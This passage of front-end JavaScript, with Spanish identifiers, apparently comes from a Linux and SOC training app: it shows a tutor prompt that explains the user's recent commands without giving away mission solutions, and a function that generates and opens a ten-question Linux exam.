      pregunta: pregunta || "Explícame qué hicieron mis últimos comandos y, si me equivoqué, por qué falló y cómo se hace bien (sin darme la solución completa de la misión)." }, caja);
    caja.innerHTML = `<div class="respuesta-tutor">${md(r.respuesta)}</div>`;
  } catch (e) { caja.innerHTML = `<p class="error">${esc(e.message)}</p>`; }
}

async function examenLinux() {
  const n = 10;
  irExamenMundo("linux");
  const caja = $("#examenVista");
  try {
    const { id } = await trabajo("/api/examen/generar", { dominio: "linux", n, nivel: "Intermedio", descripcion: "Linux para redes y SOC: archivos, permisos, procesos, servicios, red, logs y bash" }, caja);
    await abrirExamen(id);
  } catch (e) { caja.innerHTML = `<div class="tarjeta error">${esc(e.message)}</div>`; }
}
